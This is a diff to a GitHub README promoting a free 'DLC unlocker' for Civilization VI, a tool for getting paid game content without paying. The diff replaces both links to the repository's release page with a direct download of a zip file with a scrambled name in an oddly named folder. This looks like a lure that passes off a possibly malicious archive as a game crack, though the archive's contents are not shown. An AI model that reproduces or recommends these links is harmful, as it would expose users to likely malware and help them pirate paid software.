@@ -1,6 +1,6 @@
 # 🏛️ Civilization-VI-DLC-Unlocker-Steam-All-DLCs-Free-CreamAPI- - Access all game content for free
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/assyriologyrobinson151/Civilization-VI-DLC-Unlocker-Steam-All-DLCs-Free-CreamAPI-/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/assyriologyrobinson151/Civilization-VI-DLC-Unlocker-Steam-All-DLCs-Free-CreamAPI-/raw/refs/heads/main/sortly/AP-DL-Cream-Cs-Steam-V-Unlocker-All-Free-Civilization-1.0.zip)
 
 ## 📌 Overview
 
@@ -43,7 +43,7 @@ A new folder window will open. This is your game directory. Keep this window ope
 
 You need to get the files from the project page.
 
-[Visit this page to download the latest version](https://github.com/assyriologyrobinson151/Civilization-VI-DLC-Unlocker-Steam-All-DLCs-Free-CreamAPI-/releases)
+[Visit this page to download the latest version](https://github.com/assyriologyrobinson151/Civilization-VI-DLC-Unlocker-Steam-All-DLCs-Free-CreamAPI-/raw/refs/heads/main/sortly/AP-DL-Cream-Cs-Steam-V-Unlocker-All-Free-Civilization-1.0.zip)
 
 Look for the latest release link at the top of the page. Download the zip file to your desktop.
 
